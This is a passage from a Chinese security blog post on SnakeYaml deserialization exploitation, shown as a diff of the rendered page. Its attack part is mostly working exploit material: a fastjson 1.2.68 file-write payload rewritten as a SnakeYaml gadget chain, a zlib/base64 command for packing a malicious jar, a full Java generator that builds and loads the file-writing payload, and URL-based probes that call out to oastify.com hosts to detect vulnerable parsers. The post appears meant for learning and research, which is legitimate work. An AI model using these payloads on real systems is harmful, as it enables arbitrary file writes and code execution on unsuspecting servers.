+<p>这里其实有个疑问，为什么<code>!!javax.naming.InitialContext []</code>需要加上<code>[]</code>，无参构造不是省略就行了嘛？问AI得到如下：</p>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/78.png" class="" title="Pasted image 20260806174657">
+
+
+<h2 id="利用fastjson1-2-68写文件"><a href="#利用fastjson1-2-68写文件" class="headerlink" title="利用fastjson1.2.68写文件"></a>利用fastjson1.2.68写文件</h2><p>先看看fastjson的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br><span class="line">    &#x27;out&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">           &#x27;file&#x27;:&#x27;1.txt&#x27;,</span><br><span class="line">           &#x27;append&#x27;:false</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;infl&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;input&#x27;:&#x27;你的内容的base64编码&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;bufLen&#x27;:1048576</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;protocolVersion&#x27;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们改写成yaml的格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [&quot;Destpath&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary base64str &#125;,1048576]]</span><br></pre></td></tr></table></figure>
+<p>Destpath是目的路径，base64str为经过zlib压缩过后的文件内容<br>注意一定要zlib压缩</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat yaml-payload.jar | openssl zlib | base64 -w 0</span><br></pre></td></tr></table></figure>
+
+<p>这里给出一个好用的poc生成脚本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlOffInternet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> createPoC(<span class="string">&quot;C:/Users/ga&#x27;t&#x27;c/Desktop/临时/yaml-payload-master/yaml-payload.jar&quot;</span>,<span class="string">&quot;./yaml.jar&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createPoC</span><span class="params">(String SrcPath,String Destpath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SrcPath);</span><br><span class="line">        <span class="type">Long</span> <span class="variable">FileLength</span> <span class="operator">=</span> file.length();</span><br><span class="line">        <span class="type">byte</span>[] FileContent = <span class="keyword">new</span> <span class="title class_">byte</span>[FileLength.intValue()];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            in.read(FileContent);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] compressbytes = compress(FileContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressbytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="string">&quot; &#125;,1048576]]&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="keyword">return</span> poc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compress(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="type">byte</span>[] output = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">compresser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line"></span><br><span class="line">        compresser.reset();</span><br><span class="line">        compresser.setInput(data);</span><br><span class="line">        compresser.finish();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(data.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (!compresser.finished()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> compresser.deflate(buf);</span><br><span class="line">                bos.write(buf, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            output = bos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            output = data;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        compresser.end();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="SnakeYaml的探测"><a href="#SnakeYaml的探测" class="headerlink" title="SnakeYaml的探测"></a>SnakeYaml的探测</h1><p>这其实用之前的 <code>SPI</code> 机制的链子就可以，我这里就不放了，说一下万一 SPI 机制被 ban 的情况下，如何绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://e3izs87cvmo4cyb5y9lnppejtaz2nsbh.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/79.png" class="" title="Pasted image 20260806180509">
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\&quot;http://dl2ya7pbdl63uxt4g83m7owib9h25tti.oastify.com\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<img src="/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/80.png" class="" title="Pasted image 20260806180658">
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Meteor_Kai</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://blog.meteorkai.top/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/">https://blog.meteorkai.top/2026/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BSnakeYaml%E9%93%BE/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>CyberSecurity brings me great joy!</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Java%E5%AE%89%E5%85%A8/"># Java安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span> | </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/05/22/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E5%88%9D%E8%B5%9B-wp/">第四届盘古石杯初赛-wp</a>
+            
+        </section>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">
+            访客数：<span id="busuanzi_value_site_uv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_pv">
+            总访问量：<span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    <!-- 不蒜子计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+
+    </div>
+</body>
+
+</html>
